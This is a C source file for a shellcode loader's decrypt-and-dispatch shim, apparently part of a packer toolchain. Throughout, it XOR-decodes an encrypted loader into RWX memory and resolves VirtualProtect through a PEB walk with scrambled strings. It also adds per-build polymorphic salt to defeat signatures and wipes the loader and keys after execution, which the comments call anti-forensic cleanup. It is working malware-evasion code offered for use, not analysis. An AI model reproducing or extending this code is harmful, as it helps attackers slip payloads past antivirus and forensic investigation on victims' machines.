/**
 * Function-Granular Dispatch Shim
 *
 * Replaces loader/veh_shim.c. Sits between the XOR decoder and the
 * loader in the PIC blob (same architectural slot). Entered via
 * fallthrough after the outer XOR decoder finishes.
 *
 * Model:
 *   - The loader is partitioned into 1..N protected functions plus
 *     any bytes not covered by an entry (implicitly resident).
 *   - A build-time fn table (fritter fills it in) records
 *     {offset, size, key, flags} per protected function.
 *   - The shim decrypts each protected function on entry, calls the
 *     loader, then wipes on return. Per-function encrypt-on-callback
 *     is a future refinement (needs asm thunks + call-site rewriting
 *     in pack.h, deferred until per-function boundaries survive the
 *     linker merge).
 *
 * v1 always ships with N=1: a single entry covers the entire loader
 * with one XOR key. Same architectural shape as N>1; the shim code
 * doesn't change when N grows. What changes is fritter's fn-table
 * population.
 *
 * What this replaces vs veh_shim.c:
 *   - No RtlAddVectoredExceptionHandler registration
 *   - No SlidingVehHandler
 *   - No per-page master key / per-page XOR
 *   - No VirtualProtect churn (single RW->RWX call at entry)
 *   - No first-chance access-violation storm
 *
 * What stays the same:
 *   - VirtualProtect is still needed once to flip loader RW->RWX
 *   - PEB walk + kernel32 export resolve for VirtualProtect
 *   - Stack-built strings XOR-scrambled with SHIM_STRING_XOR
 *   - Per-build poly-salt sites for structural variation
 *   - Anti-forensic wipe of loader region on return
 *   - Shim page stays RWX so its return path is executable
 */

#include <stdint.h>
#include <windows.h>
#include "peb.h"

#define RVA2VA(type, base, rva) (type)((ULONG_PTR)(base) + (rva))

/* Pull in the per-build polymorphism salt. Same header the old shim
   used; symbols starting with SHIM_ still cover this file. */
#if defined(__has_include)
#  if __has_include("poly_seed.h")
#    include "poly_seed.h"
#  endif
#endif
#ifndef SHIM_POLY_SALT
#  define SHIM_POLY_SALT 0u
#endif
#ifndef SHIM_STRING_XOR
#  define SHIM_STRING_XOR 0xA5u
#endif
#ifndef SHIM_PEB_PICK
#  define SHIM_PEB_PICK 0u
#endif
#ifndef SHIM_WIPE_BYTE
#  define SHIM_WIPE_BYTE 0x00u
#endif

/* SX(): per-build XOR-scramble of API/DLL literals so they never
   materialize on the stack or in the shim's .text. Null terminator
   is deliberately unscrambled so C string traversal terminates. */
#define SX(c) ((char)((unsigned char)(c) ^ SHIM_STRING_XOR))

/* IN_TEXT_Z pins module-level data into .text so exe2h captures it.
   MSVC: routes via .veh$z (the old shim's naming, kept so the
   linker merge directive below stays valid). gcc: direct section
   attribute. */
#ifdef _MSC_VER
#  pragma section(".veh$z", read, execute)
#  pragma comment(linker, "/MERGE:.veh=.text")
#  define IN_TEXT_Z __declspec(allocate(".veh$z"))
#else
#  define IN_TEXT_Z __attribute__((section(".text"), used))
#endif

/* IN_DISP pins the dispatcher into its own PE code section so exe2h's
   multi-section path picks it up. Fritter then reads DISPATCH_SHIM_FNS[1]
   from the shim's companion fn_table header to learn the dispatcher's
   offset within the shim blob, no marker scan needed.
   MSVC: .disp$a is a fresh code section (read+execute). gcc: named
   attribute section, source-order-preserved by -fno-toplevel-reorder. */
#ifdef _MSC_VER
/* code_seg alone allocates .disp$a as a CODE section (IMAGE_SCN_CNT_CODE);
   using #pragma section first would lock it in as data-with-execute, which
   exe2h's IMAGE_SCN_CNT_CODE scan would miss.
   Force retention: link-time dead-code elim would otherwise drop
   DispatcherEntry (nothing in the shim calls it), collapsing .disp
   back to zero. /INCLUDE keeps it. */
#  define IN_DISP __declspec(code_seg(".disp$a"))
#  pragma comment(linker, "/INCLUDE:DispatcherEntry")
#else
#  define IN_DISP __attribute__((section(".disp"), used))
#endif

/* API type aliases */
typedef BOOL  (WINAPI *VP_fn)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef void* (*LoaderEntry_fn)(void*);

/* Sentinels patched into the shim blob by fritter's build_loader.
   Only two survive from the veh_shim scheme; VEH_MODE and PAGE_KEY_*
   are retired. */
#define SENTINEL_LOADER_OFFSET  0xDEAD0001u
#define SENTINEL_LOADER_SIZE    0xDEAD0002u

/* ================================================================
 * Fn table
 * ================================================================
 * Located in the shim's .text by a fixed 8-byte marker so fritter
 * can find it without needing a sentinel-relative address. Layout:
 *
 *   offset 0..7   marker (FN_TABLE_MARKER, unique 64-bit sentinel)
 *   offset 8..11  fn_count (uint32_t, patched by fritter)
 *   offset 12..15 pad (reserved)
 *   offset 16..   MAX_FN_COUNT entries of FN_ENTRY (12 bytes each)
 *
 * All fields are patched by fritter at build time. The marker is
 * unique enough that a linear scan of the shim blob will find it
 * without ambiguity.
 * ================================================================ */

#define FN_TABLE_MARKER_LO  0xF17E7AB1u
#define FN_TABLE_MARKER_HI  0xF17E7AB1u
#define MAX_FN_COUNT        16

/* FN_ENTRY - one per protected function. 12 bytes exactly.
   flags bit 0: RESIDENT, never encrypted at rest, no crypt work
                by shim OR dispatcher (dispatcher fast-path calls directly).
   flags bit 1: SHIM_DECRYPT, encrypted at rest, shim decrypts once at
                entry (v1 whole-loader model). Not dispatcher-managed.
                Under N>1 per-function dispatch, protected sections have
                NEITHER flag: encrypted at rest, dispatcher decrypts on
                each call and re-encrypts on return. */
#define FN_FLAG_RESIDENT     0x01u
#define FN_FLAG_SHIM_DECRYPT 0x02u

typedef struct {
    uint32_t offset;
    uint32_t size;
    uint8_t  key;
    uint8_t  flags;
    uint16_t _pad;
} FN_ENTRY;

/* Combined marker + count + entries lives in a raw byte array with
   the marker at offset 0. Defined at the file tail so under gcc's
   -fno-toplevel-reorder it lands AFTER DispatchShimEntry in .text.
   Fritter locates it by scanning for the marker bytes. */
#define FN_TABLE_AREA_SIZE  (16 + MAX_FN_COUNT * sizeof(FN_ENTRY))
extern volatile uint8_t g_fn_table_area[];

/* Forward declarations */
static void  *shim_find_dll(char *dll_name);
static void  *shim_get_export(void *base, char *api_name);
static int    shim_stricmp(const char *a, const char *b);
static int    shim_strcmp(const char *a, const char *b);
static void   shim_xor_region(uint8_t *base, uint32_t size, uint8_t key);
static void   shim_wipe_region(uint8_t *base, uint32_t size, uint8_t byte);

/* DispatcherEntry, placeholder in .disp so the section exists and
 * exe2h reports its offset in DISPATCH_SHIM_FNS[1].
 *
 * The real dispatcher body is NOT reserved here. Fritter appends the
 * dispatcher bytes at the tail of the packaged shim blob at build
 * time (grows the blob by the dispatcher size, records the new offset
 * for thunk targeting). This keeps the shim source compact and lets
 * the dispatcher size vary per polymorphism seed later without
 * touching source.
 *
 * A stray runtime jump into this stub is a no-op that returns cleanly. */
IN_DISP void DispatcherEntry(void) {
    return;
}

/* DispatchShimEntry - MUST be at .text+0. Entered via fallthrough
   from the XOR decoder. RCX = instance, RDX = shim base.
   Pinned to .text$a under MSVC so /Gy COMDAT ordering doesn't
   reorder it. */
#ifdef _MSC_VER
__declspec(code_seg(".text$a"))
#endif
void DispatchShimEntry(void *inst, void *shim_base) {
    volatile uint32_t ldr_off  = SENTINEL_LOADER_OFFSET;
    volatile uint32_t ldr_sz   = SENTINEL_LOADER_SIZE;

    /* Salt site 1 - XOR-cancel into ldr_off (gated on bit 0). Same
       shape as the old shim's site 1: pair of volatile RMWs against
       an already-volatile field so the compiler cannot fold. Salt
       constants appear as immediate operands woven into real code. */
    #if (SHIM_POLY_SALT & 0x00000001u)
    { uint32_t _s1 = ((uint32_t)SHIM_POLY_SALT >> 1) ^ 0xA5A50000u;
      ldr_off ^= _s1; ldr_off ^= _s1; }
    #endif

    /* Salt site 2 - XOR-cancel into ldr_sz, gated on bit 4. */
    #if (SHIM_POLY_SALT & 0x00000010u)
      #if (SHIM_POLY_SALT & 0x00000020u)
      { uint32_t _s2 = ((uint32_t)SHIM_POLY_SALT << 7) ^ 0xDEADBEEFu;
        ldr_sz ^= _s2; ldr_sz ^= _s2; }
      #else
      { uint16_t _s2 = (uint16_t)((SHIM_POLY_SALT >> 11) + 0xCAFEu);
        ldr_sz += _s2; ldr_sz -= _s2; }
      #endif
    #endif

    /* Stack-built API strings, XOR-scrambled via SX(). Only kernel32
       + VirtualProtect are needed - no ntdll / VEH APIs anymore. */
    char s_k32[] = {SX('k'),SX('e'),SX('r'),SX('n'),SX('e'),SX('l'),
                    SX('3'),SX('2'),SX('.'),SX('d'),SX('l'),SX('l'),0};
    char s_vp[]  = {SX('V'),SX('i'),SX('r'),SX('t'),SX('u'),SX('a'),SX('l'),
                    SX('P'),SX('r'),SX('o'),SX('t'),SX('e'),SX('c'),SX('t'),0};

    void *loader_base = (char*)shim_base + ldr_off;

    /* Resolve VirtualProtect */
    void *k32 = shim_find_dll(s_k32);
    if (!k32) return;
    VP_fn pVP = (VP_fn)shim_get_export(k32, s_vp);
    if (!pVP) return;

    /* Read fn table: count + entries. The address of g_fn_table_area
       is RIP-rel from the shim's own code, so it's PIC. Layout is
       fixed regardless of where fritter placed the shim in memory. */
    volatile uint8_t *ft = g_fn_table_area;
    uint32_t fn_count;
    /* fn_count lives at offset 8..11 (after 8-byte marker) */
    fn_count = ((uint32_t)ft[ 8]      ) |
               ((uint32_t)ft[ 9] <<  8) |
               ((uint32_t)ft[10] << 16) |
               ((uint32_t)ft[11] << 24);
    if (fn_count == 0 || fn_count > MAX_FN_COUNT) return;

    FN_ENTRY *fns = (FN_ENTRY*)(g_fn_table_area + 16);

    /* Compute the page range covering the loader. RWX in one call:
       we're about to XOR-write instructions in place, then execute
       them. VirtualProtect grants both permissions atomically. */
    ULONG_PTR first_page = (ULONG_PTR)loader_base & ~(ULONG_PTR)0xFFF;
    ULONG_PTR last_page  = ((ULONG_PTR)loader_base + ldr_sz - 1) & ~(ULONG_PTR)0xFFF;
    volatile SIZE_T protect_len = last_page - first_page + 0x1000;
    DWORD old;

    if (!pVP((void*)first_page, protect_len, PAGE_EXECUTE_READWRITE, &old)) return;

    /* Decrypt each SHIM_DECRYPT entry in place. Under v1 whole-loader
       dispatch, one entry covers the entire loader with FN_FLAG_SHIM_DECRYPT
       set. Under N>1 per-function dispatch, no entries have this flag,
       the dispatcher (living at the loader-blob tail) owns the crypt
       cycle for every protected section on a per-call basis. */
    for (uint32_t i = 0; i < fn_count; i++) {
        FN_ENTRY *e = &fns[i];
        if (e->flags & FN_FLAG_RESIDENT) continue;
        if (!(e->flags & FN_FLAG_SHIM_DECRYPT)) continue;
        if (e->size == 0) continue;
        shim_xor_region((uint8_t*)loader_base + e->offset, e->size, e->key);
    }

    /* Salt site 3 - XOR-cancel into a volatile mirror of protect_len,
       gated on bit 8. Different operand width picked by bit 9. */
    #if (SHIM_POLY_SALT & 0x00000100u)
      #if (SHIM_POLY_SALT & 0x00000200u)
      { uint64_t _s3 = ((uint64_t)SHIM_POLY_SALT << 13) ^ 0xC0FFEEBABEDEADAULL;
        _s3 *= 0x9E3779B97F4A7C15ULL;
        protect_len ^= (SIZE_T)_s3; protect_len ^= (SIZE_T)_s3; }
      #else
      { uint32_t _s3 = SHIM_POLY_SALT ^ 0x13371337u;
        _s3 = (_s3 + 0x9E3779B9u) ^ (_s3 << 5);
        protect_len ^= (SIZE_T)_s3; protect_len ^= (SIZE_T)_s3; }
      #endif
    #endif

    /* Call the loader. This is a normal call; the loader executes
       until it returns (single-thread mode) or does NtContinue
       (oep-set mode; we never regain control in that case, so
       wipe/cleanup below is dead). */
    LoaderEntry_fn loader_entry = (LoaderEntry_fn)loader_base;
    loader_entry(inst);

    /* Salt site 4 - XOR-cancel into ldr_sz, gated on bit 12. */
    #if (SHIM_POLY_SALT & 0x00001000u)
      #if (SHIM_POLY_SALT & 0x00002000u)
        { uint32_t _s4 = SHIM_POLY_SALT ^ 0x24682468u;
          _s4 = (_s4 * 0x9E3779B9u) ^ 0xBADCAFEu;
          ldr_sz ^= _s4; ldr_sz ^= _s4; }
      #else
        { uint16_t _s4 = (uint16_t)((SHIM_POLY_SALT >> 19) ^ 0x5A5Au);
          ldr_sz += _s4; ldr_sz -= _s4; }
      #endif
    #endif

    /* Post-execution wipe. Loader region is still RWX. Overwrite
       with SHIM_WIPE_BYTE (per-build; 0 keeps original behavior).
       Destroys both plaintext instructions and any residual state.
       No re-encrypt: wipe is stronger and doesn't leave key traces. */
    pVP((void*)first_page, protect_len, PAGE_READWRITE, &old);
    shim_wipe_region((uint8_t*)first_page, (uint32_t)protect_len, SHIM_WIPE_BYTE);

    /* Wipe the fn table too - the keys are the only remaining artifact
       that could identify this loader's crypto state post-execution.
       Ordering picked from SHIM_POLY_SALT bits 16-17 to vary the
       emitted store sequence (matches old shim's scrub-ordering axis).
       g_fn_table_area is volatile so the writes are preserved. */
    {
        uint32_t area_sz = (uint32_t)FN_TABLE_AREA_SIZE;
        #if   ((SHIM_POLY_SALT >> 16) & 0x3u) == 0u
          /* Forward */
          for (uint32_t z = 0; z < area_sz; z++) g_fn_table_area[z] = SHIM_WIPE_BYTE;
        #elif ((SHIM_POLY_SALT >> 16) & 0x3u) == 1u
          /* Reverse */
          for (uint32_t z = area_sz; z-- > 0; ) g_fn_table_area[z] = SHIM_WIPE_BYTE;
        #elif ((SHIM_POLY_SALT >> 16) & 0x3u) == 2u
          /* Even-index first, then odd */
          for (uint32_t z = 0; z < area_sz; z += 2) g_fn_table_area[z] = SHIM_WIPE_BYTE;
          for (uint32_t z = 1; z < area_sz; z += 2) g_fn_table_area[z] = SHIM_WIPE_BYTE;
        #else
          /* Odd-index first, then even */
          for (uint32_t z = 1; z < area_sz; z += 2) g_fn_table_area[z] = SHIM_WIPE_BYTE;
          for (uint32_t z = 0; z < area_sz; z += 2) g_fn_table_area[z] = SHIM_WIPE_BYTE;
        #endif
    }

    /* Cannot drop X from the shim page - epilogue still executes on
       return. Same rule as the old shim. The 4KB RWX shim page is
       the residual footprint. */
}

/* ================================================================
 * XOR crypt + wipe helpers
 * ================================================================ */

static void shim_xor_region(uint8_t *base, uint32_t size, uint8_t key) {
    /* Simple per-byte XOR. size can be any value; no alignment
       assumption. Called from DispatchShimEntry on RWX pages. */
    for (uint32_t i = 0; i < size; i++) base[i] ^= key;
}

static void shim_wipe_region(uint8_t *base, uint32_t size, uint8_t byte) {
    /* Overwrite with the per-build wipe byte. Matches the old shim's
       "fill entire loader region" cleanup. */
    for (uint32_t i = 0; i < size; i++) base[i] = byte;
}

/* ================================================================
 * PEB walk + export resolver (unchanged from veh_shim.c)
 * ================================================================ */
static void *shim_find_dll(char *dll_name) {
    PPEB peb = GET_PEB();
    PPEB_LDR_DATA ldr = peb->Ldr;

#if SHIM_PEB_PICK
    PLIST_ENTRY head  = &ldr->InInitializationOrderModuleList;
#else
    PLIST_ENTRY head  = &ldr->InMemoryOrderModuleList;
#endif
    PLIST_ENTRY entry = head->Flink;

    while (entry != head) {
#if SHIM_PEB_PICK
        PLDR_DATA_TABLE_ENTRY dte = (PLDR_DATA_TABLE_ENTRY)(
            (PBYTE)entry - (ULONG_PTR)&((PLDR_DATA_TABLE_ENTRY)0)->InInitializationOrderLinks);
#else
        PLDR_DATA_TABLE_ENTRY dte = (PLDR_DATA_TABLE_ENTRY)(
            (PBYTE)entry - (ULONG_PTR)&((PLDR_DATA_TABLE_ENTRY)0)->InMemoryOrderLinks);
#endif

        if (dte->DllBase != 0) {
            PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dte->DllBase;
            PIMAGE_NT_HEADERS nt  = RVA2VA(PIMAGE_NT_HEADERS, dte->DllBase, dos->e_lfanew);
            DWORD rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
            if (rva != 0) {
                PIMAGE_EXPORT_DIRECTORY exp = RVA2VA(PIMAGE_EXPORT_DIRECTORY, dte->DllBase, rva);
                char *name = RVA2VA(char*, dte->DllBase, exp->Name);
                if (shim_stricmp(name, dll_name) == 0) {
                    return dte->DllBase;
                }
            }
        }
        entry = entry->Flink;
    }
    return 0;
}

static void *shim_get_export(void *base, char *api_name) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  = RVA2VA(PIMAGE_NT_HEADERS, base, dos->e_lfanew);
    DWORD rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (rva == 0) return 0;

    PIMAGE_EXPORT_DIRECTORY exp = RVA2VA(PIMAGE_EXPORT_DIRECTORY, base, rva);
    PDWORD adr = RVA2VA(PDWORD, base, exp->AddressOfFunctions);
    PDWORD sym = RVA2VA(PDWORD, base, exp->AddressOfNames);
    PWORD  ord = RVA2VA(PWORD,  base, exp->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *name = RVA2VA(char*, base, sym[i]);
        if (shim_strcmp(name, api_name) == 0) {
            return RVA2VA(void*, base, adr[ord[i]]);
        }
    }
    return 0;
}

/* Convention: a = plaintext (PEB / export table), b = scrambled
   stack-built string. */
static int shim_stricmp(const char *a, const char *b) {
    while (*a && *b) {
        char bc = (char)((unsigned char)*b ^ SHIM_STRING_XOR);
        if ((*a | 0x20) != (bc | 0x20)) return 1;
        a++; b++;
    }
    return (*a != *b) ? 1 : 0;
}

static int shim_strcmp(const char *a, const char *b) {
    while (*a && *b) {
        char bc = (char)((unsigned char)*b ^ SHIM_STRING_XOR);
        if (*a != bc) return 1;
        a++; b++;
    }
    return (*a != *b) ? 1 : 0;
}

/* memset stub, the shim links with -nodefaultlib. MSVC emits a call
   to memset for the zero-fill tail of the partially-initialized
   g_fn_table_area below; without this stub the link fails. Placed
   at the tail (with g_fn_table_area) so under gcc's -fno-toplevel-
   reorder it lands AFTER DispatchShimEntry, not at .text+0. */
#ifdef _MSC_VER
#pragma function(memset)
#endif
void *memset(void *dst, int c, size_t n) {
    uint8_t *p = (uint8_t*)dst;
    for (size_t i = 0; i < n; i++) p[i] = (uint8_t)c;
    return dst;
}

/* Fn table definition, placed at the tail of the source file so
   under both compilers it lands AFTER DispatchShimEntry in .text.
   MSVC: /Gy COMDAT + .veh$z merged into .text keeps entry at .text+0.
   gcc: -fno-toplevel-reorder honors source order → entry first.

   Only the 8-byte marker is initialized in source; fritter fills in
   count + entries at build time. The array is declared volatile so
   the wipe stores in DispatchShimEntry aren't dead-code eliminated. */
IN_TEXT_Z volatile uint8_t g_fn_table_area[FN_TABLE_AREA_SIZE] = {
    (uint8_t)(FN_TABLE_MARKER_LO      ), (uint8_t)(FN_TABLE_MARKER_LO >>  8),
    (uint8_t)(FN_TABLE_MARKER_LO >> 16), (uint8_t)(FN_TABLE_MARKER_LO >> 24),
    (uint8_t)(FN_TABLE_MARKER_HI      ), (uint8_t)(FN_TABLE_MARKER_HI >>  8),
    (uint8_t)(FN_TABLE_MARKER_HI >> 16), (uint8_t)(FN_TABLE_MARKER_HI >> 24),
    /* remainder zero-initialized; fritter patches count + entries */
};
